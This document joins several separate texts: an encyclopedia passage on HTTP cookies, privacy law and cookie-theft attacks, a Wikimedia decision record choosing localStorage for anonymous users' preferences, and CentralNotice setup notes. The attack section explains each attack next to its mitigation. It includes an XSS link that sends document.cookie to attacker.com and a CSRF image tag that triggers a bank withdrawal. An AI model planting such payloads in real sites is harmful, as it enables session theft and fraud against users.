The HttpOnly attribute directs browsers not to expose cookies through channels other than HTTP (and HTTPS) requests. This means that the cookie cannot be accessed via client-side scripting languages (notably JavaScript), and therefore cannot be stolen easily via cross-site scripting (a pervasive attack technique).[57]


BROWSER SETTINGS

Most modern browsers support cookies and allow the user to disable them. The following are common options:[58]

 * To enable or disable cookies completely, so that they are always accepted or always blocked.
 * To view and selectively delete cookies using a cookie manager.
 * To fully wipe all private data, including cookies.

Add-on tools for managing cookie permissions also exist.[59][60][61][62]


THIRD-PARTY COOKIE

Main article: Third-party cookies
See also: Web analytics § Problems with cookies

Cookies have some important implications for the privacy and anonymity of web users. While cookies are sent only to the server setting them or a server in the same Internet domain, a web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called third-party cookies. A third-party cookie, belongs to a domain different from the one shown in the address bar. This sort of cookie typically appears when web pages feature content from external websites, such as banner advertisements. This opens up the potential for tracking the user's browsing history and is used by advertisers to serve relevant advertisements to each user.

In this fictional example, an advertising company has placed banners in two websites. By hosting the banner images on its servers and using third-party cookies, the advertising company is able to track the browsing of users across these two sites.

As an example, suppose a user visits www.example.org. This website contains an advertisement from ad.foxytracking.com, which, when downloaded, sets a cookie belonging to the advertisement's domain (ad.foxytracking.com). Then, the user visits another website, www.foo.com, which also contains an advertisement from ad.foxytracking.com and sets a cookie belonging to that domain (ad.foxytracking.com). Eventually, both of these cookies will be sent to the advertiser when loading their advertisements or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites that have ads from this advertiser, through the use of the HTTP referer header field.

As of 2014[update], some websites were setting cookies readable for over 100 third-party domains.[63] On average, a single website was setting 10 cookies, with a maximum number of cookies (first- and third-party) reaching over 800.[64]

The older standards for cookies, RFC 2109[17] and RFC 2965, recommend that browsers should protect user privacy and not allow sharing of cookies between servers by default. However, the newer standard, RFC 6265, explicitly allows user agents to implement whichever third-party cookie policy they wish. Most modern web browsers contain privacy settings that can block third-party cookies. Since 2020, Apple Safari,[65] Firefox,[66] and Brave[67] block all third-party cookies by default. Safari allows embedded sites to use Storage Access API to request permission to set first-party cookies. In May 2020, Google Chrome 83 introduced new features to block third-party cookies by default in its Incognito mode for private browsing, making blocking optional during normal browsing. The same update also added an option to block first-party cookies.[68] In April 2024, Chrome postponed third-party cookie blocking by default to 2025.[69] In July 2024, Google announced plan to avoid blocking third-party cookies by default and instead prompt users to allow third-party cookies.[70]


PRIVACY

See also: Do Not Track

The possibility of building a profile of users is a privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.

Website operators who do not disclose third-party cookie use to consumers run the risk of harming consumer trust if cookie use is discovered. Having clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of such cookie discovery.[71][failed verification]

The United States government has set strict rules on setting cookies in 2000 after it was disclosed that the White House drug policy office used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the CIA had been leaving persistent cookies on computers that had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them. On December 25, 2005, Brandt discovered that the National Security Agency (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the NSA immediately disabled the cookies.[72]


EU COOKIE DIRECTIVE

In 2002, the European Union launched the Directive on Privacy and Electronic Communications (e-Privacy Directive), a policy requiring end users' consent for the placement of cookies, and similar technologies for storing and accessing information on users' equipment.[73][74] In particular, Article 5 Paragraph 3 mandates that storing technically unnecessary data on a user's computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storage operation. The Directive does not require users to authorise or be provided notice of cookie usage that are functionally required for delivering a service they have requested, for example to retain settings, store log-in sessions, or remember what is in a user's shopping basket.[75]

In 2009, the law was amended by Directive 2009/136/EC, which included a change to Article 5, Paragraph 3. Instead of having an option for users to opt out of cookie storage, the revised Directive requires consent to be obtained for cookie storage.[74] The definition of consent is cross-referenced to the definition in European data protection law, firstly the Data Protection Directive 1995 and subsequently the General Data Protection Regulation (GDPR). As the definition of consent was strengthened in the text of the GDPR, this had the effect of increasing the quality of consent required by those storing and accessing information such as cookies on users devices. In a case decided under the Data Protection Directive however, the Court of Justice of the European Union later confirmed however that the previous law implied the same strong quality of consent as the current instrument.[76] In addition to the requirement of consent which stems from storing or accessing information on a user's terminal device, the information in many cookies will be considered personal data under the GDPR alone, and will require a legal basis to process. This has been the case since the 1995 Data Protection Directive, which used an identical definition of personal data, although the GDPR in interpretative Recital 30 clarifies that cookie identifiers are included. While not all data processing under the GDPR requires consent, the characteristics of behavioural advertising mean that it is difficult or impossible to justify under any other ground.[77][78]

Consent under the combination of the GDPR and e-Privacy Directive has to meet a number of conditions in relation to cookies.[79] It must be freely given and unambiguous: preticked boxes were banned under both the Data Protection Directive 1995[76] and the GDPR (Recital 32).[80] The GDPR is specific that consent must be as 'easy to withdraw as to give',[80] meaning that a reject-all button must be as easy to access in terms of clicks and visibility as an 'accept all' button.[79] It must be specific and informed, meaning that consent relates to particular purposes for the use of this data, and all organisations seeking to use this consent must be specifically named.[81][82] The Court of Justice of the European Union has also ruled that consent must be 'efficient and timely', meaning that it must be gained before cookies are laid and data processing begins instead of afterwards.[83]

The industry's response has been largely negative. Robert Bond of the law firm Speechly Bircham describes the effects as "far-reaching and incredibly onerous" for "all UK companies". Simon Davis of Privacy International argues that proper enforcement would "destroy the entire industry".[84] However, scholars note that the onerous nature of cookie pop-ups stems from an attempt to continue to operate a business model through convoluted requests that may be incompatible with the GDPR.[77]

Academic studies and regulators both describe widespread non-compliance with the law. A study scraping 10,000 UK websites found that only 11.8% of sites adhered to minimal legal requirements, with only 33.4% of websites studied providing a mechanism to reject cookies that was as easy to use as accepting them.[79] A study of 17,000 websites found that 84% of sites breached this criterion, finding additionally that many laid third party cookies with no notice at all.[85] The UK regulator, the Information Commissioner's Office, stated in 2019 that the industry's 'Transparency and Consent Framework' from the advertising technology group the Interactive Advertising Bureau was 'insufficient to ensure transparency and fair processing of the personal data in question and therefore also insufficient to provide for free and informed consent, with attendant implications for PECR [e-Privacy] compliance.'[81] Many companies that sell compliance solutions (Consent Management Platforms) permit them to be configured in manifestly illegal ways, which scholars have noted creates questions around the appropriate allocation of liability.[86]

A W3C specification called P3P was proposed for servers to communicate their privacy policy to browsers, allowing automatic, user-configurable handling. However, few websites implement the specification, and the W3C has discontinued work on the specification.[87]

Third-party cookies can be blocked by most browsers to increase privacy and reduce tracking by advertising and tracking companies without negatively affecting the user's web experience on all sites. Some sites operate 'cookie walls', which make access to a site conditional on allowing cookies either technically in a browser, through pressing 'accept', or both.[88] In 2020, the European Data Protection Board, composed of all EU data protection regulators, stated that cookie walls were illegal.

> In order for consent to be freely given, access to services and functionalities must not be made conditional on the consent of a user to the storing of information, or gaining of access to information already stored, in the terminal equipment of a user (so called cookie walls).[89]

Many advertising operators have an opt-out option to behavioural advertising, with a generic cookie in the browser stopping behavioural advertising.[90][91] However, this is often ineffective against many forms of tracking, such as first-party tracking that is growing in popularity to avoid the impact of browsers blocking third party cookies.[92][93] Furthermore, if such a setting is more difficult to place than the acceptance of tracking, it remains in breach of the conditions of the e-Privacy Directive.[79]

Most websites use cookies as the only identifiers for user sessions, because other methods of identifying web users have limitations and vulnerabilities. If a website uses cookies as session identifiers, attackers can impersonate users' requests by stealing a full set of victims' cookies. From the web server's point of view, a request from an attacker then has the same authentication as the victim's requests; thus the request is performed on behalf of the victim's session.

Listed here are various scenarios of cookie theft and user session hijacking (even without stealing user cookies) that work with websites relying solely on HTTP cookies for user identification.


NETWORK EAVESDROPPING

A cookie can be stolen by another computer that is allowed reading from the network.

Traffic on a network can be intercepted and read by computers on the network other than the sender and receiver (particularly over unencrypted open Wi-Fi). This traffic includes cookies sent on ordinary unencrypted HTTP sessions. Where network traffic is not encrypted, attackers can therefore read the communications of other users on the network, including HTTP cookies as well as the entire contents of the conversations, for the purpose of a man-in-the-middle attack.

An attacker could use intercepted cookies to impersonate a user and perform a malicious task, such as transferring money out of the victim's bank account.

This issue can be resolved by securing the communication between the user's computer and the server by employing Transport Layer Security (HTTPS protocol) to encrypt the connection. A server can specify the Secure flag while setting a cookie, which will cause the browser to send the cookie only over an encrypted channel, such as a TLS connection.[45]


PUBLISHING FALSE SUB-DOMAIN: DNS CACHE POISONING

If an attacker is able to cause a DNS server to cache a fabricated DNS entry (called DNS cache poisoning), then this could allow the attacker to gain access to a user's cookies. For example, an attacker could use DNS cache poisoning to create a fabricated DNS entry of f12345.www.example.com that points to the IP address of the attacker's server. The attacker can then post an image URL from his own server (for example, http://f12345.www.example.com/img_4_cookie.jpg). Victims reading the attacker's message would download this image from f12345.www.example.com. Since f12345.www.example.com is a sub-domain of www.example.com, victims' browsers would submit all example.com-related cookies to the attacker's server.

If an attacker is able to accomplish this, it is usually the fault of the Internet Service Providers for not properly securing their DNS servers. However, the severity of this attack can be lessened if the target website uses secure cookies. In this case, the attacker would have the extra challenge[94] of obtaining the target website's TLS certificate from a certificate authority, since secure cookies can only be transmitted over an encrypted connection. Without a matching TLS certificate, victims' browsers would display a warning message about the attacker's invalid certificate, which would help deter users from visiting the attacker's fraudulent website and sending the attacker their cookies.


CROSS-SITE SCRIPTING: COOKIE THEFT

Main article: Cross-site scripting

Cookies can also be stolen using a technique called cross-site scripting. This occurs when an attacker takes advantage of a website that allows its users to post unfiltered HTML and JavaScript content. By posting malicious HTML and JavaScript code, the attacker can cause the victim's web browser to send the victim's cookies to a website the attacker controls.

As an example, an attacker may post a message on www.example.com with the following link:

<a href="#" onclick="window.location = 'http://attacker.com/stole.cgi?text=' + escape(document.cookie); return false;">Click here!</a>


Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.

When another user clicks on this link, the browser executes the piece of code within the onclick attribute, thus replacing the string document.cookie with the list of cookies that are accessible from the current page. As a result, this list of cookies is sent to the attacker.com server. If the attacker's malicious posting is on an HTTPS website https://www.example.com, secure cookies will also be sent to attacker.com in plain text.

It is the responsibility of the website developers to filter out such malicious code.

Such attacks can be mitigated by using HttpOnly cookies. These cookies will not be accessible by client-side scripting languages like JavaScript, and therefore, the attacker will not be able to gather these cookies.


CROSS-SITE SCRIPTING: PROXY REQUEST

In older versions of many browsers, there were security holes in the implementation of the XMLHttpRequest API. This API allows pages to specify a proxy server that would get the reply, and this proxy server is not subject to the same-origin policy. For example, a victim is reading an attacker's posting on www.example.com, and the attacker's script is executed in the victim's browser. The script generates a request to www.example.com with the proxy server attacker.com. Since the request is for www.example.com, all example.com cookies will be sent along with the request, but routed through the attacker's proxy server. Hence, the attacker would be able to harvest the victim's cookies.

This attack would not work with secure cookies, since they can only be transmitted over HTTPS connections, and the HTTPS protocol dictates end-to-end encryption (i.e. the information is encrypted on the user's browser and decrypted on the destination server). In this case, the proxy server would only see the raw, encrypted bytes of the HTTP request.


CROSS-SITE REQUEST FORGERY

Main article: Cross-site request forgery

For example, Bob might be browsing a chat forum where another user, Mallory, has posted a message. Suppose that Mallory has crafted an HTML image element that references an action on Bob's bank's website (rather than an image file), e.g.,

<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">


If Bob's bank keeps his authentication information in a cookie, and if the cookie hasn't expired, then the attempt by Bob's browser to load the image will submit the withdrawal form with his cookie, thus authorizing a transaction without Bob's approval.


COOKIEJACKING

Cookiejacking is an attack against Internet Explorer which allows the attacker to steal session cookies of a user by tricking a user into dragging an object across the screen.[95] Microsoft deemed the flaw low-risk because of "the level of required user interaction",[95] and the necessity of having a user already logged into the website whose cookie is stolen.[96] Despite this, a researcher tried the attack on 150 of their Facebook friends and obtained cookies of 80 of them via social engineering.[95]


DRAWBACKS OF COOKIES

Besides privacy concerns, cookies also have some technical drawbacks. In particular, they do not always accurately identify users, they can be used for security attacks, and they are often at odds with the Representational State Transfer (REST) software architectural style.[97][98]


INACCURATE IDENTIFICATION

If more than one browser is used on a computer, each usually has a separate storage area for cookies. Hence, cookies do not identify a person, but a combination of a user account, a computer, and a web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.[99]

Likewise, cookies do not differentiate between multiple users who share the same user account, computer, and browser.


ALTERNATIVES TO COOKIES

Some of the operations that can be done using cookies can also be done using other mechanisms.


AUTHENTICATION AND SESSION MANAGEMENT

JSON WEB TOKENS

A JSON Web Token (JWT) is a self-contained packet of information that can be used to store user identity and authenticity information. This allows them to be used in place of session cookies. Unlike cookies, which are automatically attached to each HTTP request by the browser, JWTs must be explicitly attached to each HTTP request by the web application.

HTTP AUTHENTICATION

The HTTP protocol includes the basic access authentication and the digest access authentication protocols, which allow access to a web page only when the user has provided the correct username and password. If the server requires such credentials for granting access to a web page, the browser requests them from the user and, once obtained, the browser stores and sends them in every subsequent page request. This information can be used to track the user.

URL (QUERY STRING)

The query string part of the URL is the part that is typically used for this purpose, but other parts can be used as well. The Java Servlet and PHP session mechanisms both use this method if cookies are not enabled.

This method consists of the web server appending query strings containing a unique session identifier to all the links inside of a web page. When the user follows a link, the browser sends the query string to the server, allowing the server to identify the user and maintain state.

These kinds of query strings are very similar to cookies in that both contain arbitrary pieces of information chosen by the server and both are sent back to the server on every request. However, there are some differences. Since a query string is part of a URL, if that URL is later reused, the same attached piece of information will be sent to the server, which could lead to confusion. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by e-mail, those preferences will be used for that other user as well.

Moreover, if the same user accesses the same page multiple times from different sources, there is no guarantee that the same query string will be used each time. For example, if a user visits a page by coming from a page internal to the site the first time, and then visits the same page by coming from an external search engine the second time, the query strings would likely be different. If cookies were used in this situation, the cookies would be the same.

Other drawbacks of query strings are related to security. Storing data that identifies a session in a query string enables session fixation attacks, referer logging attacks and other security exploits. Transferring session identifiers as HTTP cookies is more secure.

HIDDEN FORM FIELDS

Another form of session tracking is to use web forms with hidden fields. This technique is very similar to using URL query strings to hold the information and has many of the same advantages and drawbacks. In fact, if the form is handled with the HTTP GET method, then this technique is similar to using URL query strings, since the GET method adds the form fields to the URL as a query string. But most forms are handled with HTTP POST, which causes the form information, including the hidden fields, to be sent in the HTTP request body, which is neither part of the URL, nor of a cookie.

This approach presents two advantages from the point of view of the tracker. First, having the tracking information placed in the HTTP request body rather than in the URL means it will not be noticed by the average user. Second, the session information is not copied when the user copies the URL (to bookmark the page or send it via email, for example).

WINDOW.NAME DOM PROPERTY

All current web browsers can store a fairly large amount of data (2–32 MB) via JavaScript using the DOM property window.name. This data can be used instead of session cookies. The technique can be coupled with JSON/JavaScript objects to store complex sets of session variables on the client side.

The downside is that every separate window or tab will initially have an empty window.name property when opened.

In some respects, this can be more secure than cookies due to the fact that its contents are not automatically sent to the server on every request like cookies are, so it is not vulnerable to network cookie sniffing attacks.


TRACKING

IP ADDRESS

Some users may be tracked based on the IP address of the computer requesting the page. The server knows the IP address of the computer running the browser (or the proxy, if any is used) and could theoretically link a user's session to this IP address.

However, IP addresses are generally not a reliable way to track a session or identify a user. Many computers designed to be used by a single user, such as office PCs or home PCs, are behind a network address translator (NAT). This means that several PCs will share a public IP address. Furthermore, some systems, such as Tor, are designed to retain Internet anonymity, rendering tracking by IP address impractical, impossible, or a security risk.

ETAG

Main article: HTTP ETag § Tracking using ETags

Because ETags are cached by the browser, and returned with subsequent requests for the same resource, a tracking server can simply repeat any ETag received from the browser to ensure an assigned ETag persists indefinitely (in a similar way to persistent cookies). Additional caching header fields can also enhance the preservation of ETag data.

ETags can be flushed in some browsers by clearing the browser cache.

BROWSER CACHE

Main article: Web cache

The browser cache can also be used to store information that can be used to track individual users. This technique takes advantage of the fact that the web browser will use resources stored within the cache instead of downloading them from the website when it determines that the cache already has the most up-to-date version of the resource.

For example, a website could serve a JavaScript file with code that sets a unique identifier for the user (for example, var userId = 3243242;). After the user's initial visit, every time the user accesses the page, this file will be loaded from the cache instead of downloaded from the server. Thus, its content will never change.

BROWSER FINGERPRINT

Main article: Device fingerprint

A browser fingerprint is information collected about a browser's configuration, such as version number, screen resolution, and operating system, for the purpose of identification. Fingerprints can be used to fully or partially identify individual users or devices even when cookies are turned off.

Basic web browser configuration information has long been collected by web analytics services in an effort to accurately measure real human web traffic and discount various forms of click fraud. With the assistance of client-side scripting languages, collection of much more esoteric parameters is possible.[100][101] Assimilation of such information into a single string constitutes a device fingerprint. In 2010, EFF measured at least 18.1 bits of entropy possible from browser fingerprinting.[102] Canvas fingerprinting, a more recent technique, claims to add another 5.7 bits.


WEB STORAGE

Main article: Web storage

Some web browsers support persistence mechanisms which allow the page to store the information locally for later use.

The HTML5 standard (which most modern web browsers support to some extent) includes a JavaScript API called Web storage that allows two types of storage: local storage and session storage. Local storage behaves similarly to persistent cookies while session storage behaves similarly to session cookies, except that session storage is tied to an individual tab/window's lifetime (AKA a page session), not to a whole browser session like session cookies.[103]

Internet Explorer supports persistent information[104] in the browser's history, in the browser's favorites, in an XML store ("user data"), or directly within a web page saved to disk.

Some web browser plugins include persistence mechanisms as well. For example, Adobe Flash has Local shared object and Microsoft Silverlight has Isolated storage.[105]

WHAT ARE YOUR CONSTRAINTS?

[edit]

General Assumptions and Requirements Source

The person or document that this requirement comes from.

This solution does not intend to replace all the existing user preference persistence mechanisms currently utilized within the mediawiki ecosystem. It does not aim to unify the other mechanisms either. Disparate mechanisms will continue to exist within different extensions.

Our initial goal will be to provide the ability to store at very least the following preferences for anonymous users:

 * Page density (page width)
 * Accessibility settings:
   * Dark Mode
   * Font size

 * TDF: Preference persistence prototype
 * Cookie Prototype

Security Requirements

Describe any security limitations or constraints for the proposed solutions.

Source

The person or document that this requirement comes from.

To ensure safety and security, we decided to restrict preference persistence to trusted extensions and skins. Cookie Prototype To enable the declaration of new Preferences, ClientPreferences should incorporate a registration mechanism through skin.json or extension.json. Skins or extensions can use this mechanism to declare their own Preferences. Cookie Prototype Privacy Requirements

Describe potential privacy limitations or constraints for the proposed solutions and how they will be mitigated.

Source

The person or document that this requirement comes from.

By using an alternative storage approaches, we can effectively address privacy concerns. We want to avoid automatically transmitting data to the server with each request and ensure that sensitive information such as user preferences and personalization data remains securely stored on the client-side. Cookie Prototype

Additional Requirements

Describe other potential limitations or constraints for the proposed solutions and how they will be mitigated.

Source

The person or document that this requirement comes from.

The solution adheres to the specified SRE-set caching restrictions.The solution has been developed in accordance with the guidelines set by the Site Reliability Engineering (SRE) team. The collaboration between the Web team and SRE has been integral to this process.

Starting from the initial meeting in April 2023, SRE's insights have been consistently considered. These inputs were not only recorded but also incorporated into the solution's development.

The ongoing interaction between the teams was facilitated through the #preference-persistence Slack channel, providing a platform for continuous contribution from SRE. This exchange of ideas in this space demonstrates a commitment to a cooperative approach in shaping the solution. Note: Slack was chosen as an initial strategic planning conversation space due to potential sensitive information and in order to minimize potential risks.

Further consultation occurred in the first week of August 2023. The feedback gathered during this consultation was integrated into the current prototype (see following column), showcasing the effort to include the most up-to-date insights and preferred approaches from SRE.

The following documentation (linked in the next column) showcases the impact of SRE in the decision-making process.

Notes - TDF Feedback: Preference Persistence For Anonymous Users, Cookie Prototype, Reading/Web/Projects/Preference persistence prototype summary, Reading/Web/Projects/Preference persistence prototype 2 summary, August 1 Meeting Notes (Timo, Moh, Jan) The solution meets specific performance constraints.Through a series of "SLOs for Web" meetings held on May 17, 2023, and May 11, 2023, we worked towards formulating a solution for meeting specific performance constraints in the Preference Persistence prorotype. The discussions centered around the concept of performance budgets as defined by Tim Kadlec, which emphasized the importance of setting well-defined limits on performance metrics to guide our development processes. By understanding the key components of performance budgets, we were able to identify concrete strategies for ensuring our solutions adhered to both staging and production-based measurements, focusing on metrics like Time to First Byte, First Contentful Paint, Largest Contentful Paint, Total Blocking Time, and Cumulative Layout Shift. Cookie Prototype, T334770: Create a proposal around basic web team centric performance SLOs, May 11 Web SLO Meeting Notes, May 17 Web SLO Meeting Notes, Sample conversation regarding this topic The solution is unambiguous for third-party contributors and outlines proper usage guidelines.The Web team has provided sources that provide comprehensive information and guidelines for third-party contributors, ensuring that they can effectively utilize the mw.user module while adhering to best practices and avoiding potential conflicts or unintended actions when interacting with user-related functionalities in MediaWiki. This includes:
 1. The properties and methods provided by the mw.user module in the MediaWiki JavaScript API clearly define the functionalities and capabilities available for managing user-related information. These include functions to retrieve user details, handle temporary user accounts, manage user preferences, and perform various checks related to user status and features.
 2. The documentation for mediawiki.user emphasizes the availability of the mw.user.clientPrefs feature, which allows manipulation of certain classes on the HTML element to control rendering for anonymous users. Importantly, this source provides specific guidelines on the format and naming convention of classes that can be manipulated, ensuring that unintended manipulation is avoided and serving as a clear indicator of classes subject to manipulation.

 1. See mw.user in MediaWiki Core Documentation
 2. See ResourceLoader/Core modules

The solution has a well-defined and extensible naming schema. It is also adaptable and currently integrated within the prototype. The documentation in ResourceLoader/Core modules establishes a clear and structured naming convention, ensuring a well-defined and extensible schema. ResourceLoader/Core modules


DECISION

[edit]

Selected Option Use localStorage as the persistence layer for user preferences. Rationale Considering the observed differences in page-load times between localStorage and cookie were negligible, along with the privacy implications of potentially fingerprinting users based on cookie values, we have opted to utilize localStorage as the persistence layer.

While LocalStorage might have a slightly more negative impact on page-load performance, it offers the advantage of accommodating lengthy preference values.

Informing Who Who was accountable for making this decision?

Jan Drewniak, Mohd Abualruz, Kim Sarabia

Date June 23, 2023

WHAT ARE YOUR OPTIONS?

[edit]

Option 1: Do Nothing Description We don’t provide anonymous users configurable experiences such as font size, limited width, dark mode without causing a layout shift or flash of unstyled content during page load Benefits Save hours of development time and free up resources for other initiatives Risks Anonymous users would not be able to customize their individual preferences and will have an unequal experience to logged in users. While billions of users might not be aware of the difference, it is a significant amount of people who are missing out on being able to use features they might appreciate and enjoy. Effort None Costs Failure to meet OKR for the Product/Web team Testing None Performance & Scaling No action means we would keep status quo and there would be no benchmarking/performance tasks or scaling targets Consultations Consulted party 1 TDF: Preference Persistence Solution Discussion Attendees: Nicholas Ray Mohd Abualruz Moriel Schottlender Nat Hillard Piotr Miazga Samuel Guebo thiemo.kreuz@wikimedia.de James Forrester Amir Sarabadani

Option 2: Implement existing cookie-based storage of anonymous user preferences Description Adds script that allows the reading of a cookie to toggle classes on the body tag, effectively enabling/disabling "features" and give anonymous users options to toggle font-size, dark mode and to remember states such as sidebar / table of contents collapsed. Benefits The cookie option is the most performant out of all the approaches Risks Serious privacy impact of potentially fingerprinting users based on cookie values Effort 1 quarter from R&D to post-deployment QA Costs
 * Developer hours into creating the TDMP from start to finish.
 * For ongoing costs, the team would need to regularly review and update the cookie-based preference system to ensure it aligns with evolving privacy regulations.

Testing
 * Validate that the cookie storage mechanism adheres to security best practices.
 * Assess the performance impact of storing and retrieving preferences using cookies.
 * Test how preferences are applied in real-time and how the application responds when preferences are changed or updated.

Performance & Scaling The response time and resource consumption to ensure efficient cookie management Deployment Testing and Quality Assurance in Beta and smaller language Wikis: Thoroughly test the functionality and performance of the cookie-based preference system in smaller user bases first. Validate that preferences are captured accurately, stored securely, and retrieved correctly across different scenarios and browsers before deploying changes to large language Wikis. Rollback and reversibility Yes, it is reversible in smaller scales. Once it is deployed in larger Wikis, it will technically be possible but extremely disruptive Operations & Monitoring Once the new solution has been deployed what data needs to be collected to monitor activity, provide feedback or report on system/service health?

Data needs to be collected on how users easily set and update their preferences, which we would measure through participation rates and speed at which they complete the action from start to finish. We would also measure the clarity of instructions and options for managing preferences, including the ability to clear or reset preferences if desired, by also measuring participation rates. This would all be done through metrics instrumentation and analysis.

Consultations Consulted party 1 See Option 1 party

Option 3 Implement localStorage solution to store anonymous user preferences Description The localStorage API stores data as key-value pairs in the browser's local storage, which remains available even when the user closes and reopens the browser. The data will be a under a single key in order to minimize synchronous reads during page load. Benefits List the positives of implementing it Risks The page-load times for localStorage were negligible in local testing, but it remains to be seen if this will remain true in production. The performance impact of localStorage is difficult to measure because the delay that it causes early on in the rendering cycle can have downstream effects. Effort 1 quarter from R&D to post-deployment QA Costs Developer hours into creating the TDMP from start to finish. Possibly lower ongoing costs as localStorage is not as heavily regulated by GDP unlike cookies. Testing
 * Assess the performance impact of storing and retrieving the single key using localStorage on small, medium, and large scales.
 * Test how preferences are applied in real-time and how the application responds when preferences are changed or updated (similar to Option 2).

Performance & Scaling As mentioned, we would need to measure the localStorage solution in different production environments because the delay that it causes early on in the rendering cycle can have different downstream effects depending on, browsers, data speed, wikis, and other circumstances not yet accounted for Deployment Same as Option 2 Rollback and reversibility Same as Option 2 Operations & Monitoring Same as Option 2, but we will test the localStorage strategy rather than cookies Additional References https://phabricator.wikimedia.org/T340459LocalStorage Prototype Consultations Consulted party 1 Same as Option 2


IMPORTANT QUESTIONS

[edit]

Question Who can answer? Resolution, answer or action Abijeet Patro: Does this mean that preference changes will only be applied after page reload? Jan Drewniak: The assumption is that there will be some UI to change these preferences, and when the user changes the value, it will be saved in localStorage, but also, changed in the HTML, so, assuming that the CSS to activate that option is loaded, the change will be instantly visible. Niklas Laxström from the Language Team: How is this possible? Given that they are loaded later? What kind of risks? What kind of risks are we talking about? Jan Drewniak: The situation we want to prevent is: after a gadget loads, it modifies these localStorage values, then, on subsequent page-views, the new "unauthorized" values would be appended to the HTML.

What we're basically proposing is keeping a list of values that are modifiable on page-load. That won't really stop gadgets from modifying existing values, but it will stop them from adding new ones.

Jon Robson: Having different values implies more processing which above in the document you state you are trying to minimize computation. Why not always use an integer since these seems to cover all types of preference? Jan Drewniak: It'll certainly work for true/false & numbers. That would reduce complexity and cover our immediate needs, and we could always expand data types in the future.

Thiemo Kreuz: It's quite common in e.g. MW API calls and user options to use 0 and 1 instead of bools. This also reduces the number of bytes that need to be stored and transferred.

Re: `1` - preference value. Must be an integer.

Jon Robson: the use of numeric values implies a feature can have multiple variants. Are there any constraints on this? Seems like it could be problematic (from technical debt/security/performance/maintenance) if a font size feature allowed changing font-size to any value.

Current POC allows for reading booleans. It will translate only to true/false. Re: `1` - preference value. Must be an integer. cont’d See patch Jon Robson: suggestion - perhaps we could limit the number of values for now e.g 0-3 ? Each value corresponds with a class and render blocking CSS so for overall performance it's likely important we limit the amount of variants. In the case of font size, 0 might be small, 1 normal and 2 large for example.




PROTOTYPES:

[edit]

While prototyping and trying out different approaches, and from gathering technical feedback, we would include in core:

CLIENT-SIDE PREFERENCES INLINE SCRIPT

[edit]
 * It allows users to enable or disable of features/preferences without logging in or creating an account.
 * It uses existing classes on the document element to avoid adding extra HTML or JavaScript.

CLIENT-SIDE PREFERENCES API

[edit]

That provides a simple API to set and get preferences.

The CentralNotice extension delivers announcements (usually in the form of banners) to Wikimedia wikis. It is used heavily by the Fundraising team to solicit donations, and for announcements of interest to Wikimedia communities and users. CentralNotice can target announcements by country, language, project, device and logged-in status.

This page has information for CentralNotice developers and wiki administrators who want to install CentralNotice on their own sites. To learn how to create and configure CentralNotice campaigns, please see Help:CentralNotice on Meta-Wiki. For information about the CentralNotice setup on the Wikimedia Foundation's cluster, see CentralNotice on Wikitech.

CentralNotice allows central distribution of announcements to many wikis (called subscribing wikis) from a central wiki (the infrastructure wiki). If you only need to post messages to a single wiki, consider using Sitenotice instead.


INSTALLATION

CentralNotice is developed, tested, and known to be deployed only on wikis that do not use table prefixing. If your setup uses table prefixing there is no guarantee this extension will work. Please report any bugs to Phabricator.

 2. Add to LocalSettings.php the following:
    
    wfLoadExtension( 'CentralNotice' );
    

 3. By default, GeoIP lookup is disabled. If the Geo cookie is pre-populated, however, its value will be used. For local development, you can enable a client-side implementation that uses https://freegeoip.net as follows. For more information, see #GeoIP lookup.

$wgCentralNoticeGeoIPBackgroundLookupModule = 'ext.centralNotice.freegeoipLookup';



THE INFRASTRUCTURE WIKI

 1. From the command line, go to the wiki root and run php maintenance/run.php update
 2. Edit LocalSettings.php and set ...
    1. $wgNoticeInfrastructure to true
    2. $wgNoticeProjects to be an array of projects that will subscribe to the central wiki. For example array( 'wikipedia', 'wiktionary' )
 3. By default the sysop group is the only group with the ability to administer CentralNotice. If additional groups are needed, assign them the centralnotice-admin and edit-interface permissions.


SUBSCRIBING WIKIS

Edit LocalSettings.php and set...

 1. $wgNoticeInfrastructure to false;
 2. $wgNoticeProject to be an entry in $wgNoticeProjects;
 3. $wgCentralHost to the protocol (potentially neutral) and domain of the central wiki. For example //meta.wikimedia.org;
 4. $wgCentralSelectedBannerDispatcher to the URL of Special:BannerLoader on the central wiki, for example: //meta.wikimedia.org/w/index.php/Special:BannerLoader;
 5. either $wgCentralDBname to the name of the infrastructure wiki's database, or $wgCentralNoticeApiUrl to the API endpoint of the infrastructure wiki; and
 6. $wgCentralBannerRecorder to the URL of Special:RecordImpression on the central wiki. For example: //meta.wikimedia.org/w/index.php/Special:RecordImpression.


QUICK DEVELOPER SETUP

For most development tasks, you can use a single wiki in both infrastructure and subscribing roles. Following are sample lines to include in LocalSetting.php. (See notes in comments.)

wfLoadExtension( 'CentralNotice' );
$wgNoticeInfrastructure = true;
$wgNoticeProject = 'centralnoticeproject'; # 'centralnoticeproject' can be any string
$wgNoticeProjects = [ $wgNoticeProject ];
$wgCentralHost = $wgServer;
$wgCentralSelectedBannerDispatcher = "$wgServer$wgScriptPath/index.php?title=Special:BannerLoader";
$wgCentralDBname = $wgDBname;
$wgCentralNoticeGeoIPBackgroundLookupModule = 'ext.centralNotice.freegeoipLookup';


All code that runs on subscribing wikis should be smoke-tested with MobileFrontend , to ensure they work on the mobile version of the site.


DEPENDENCIES

Some CentralNotice features require other MediaWiki extensions, including EventLogging and Translate .


GETTING HELP

The WMF Fundraising tech team are the maintainers of CentralNotice. For questions about installation, bug reports, or usage of CentralNotice please send an email to the mailing list wikitech-l@lists.wikimedia.org or join us in the IRC channel #wikimedia-fundraising connect.


PERMISSIONS

 * centralnotice-admin — Permission required to modify campaigns and banners. Relevant only to the infrastructure wikis (see also bugzilla:26377).
   * edit-interface is required to edit banner content.


DESIGN CONCEPTS

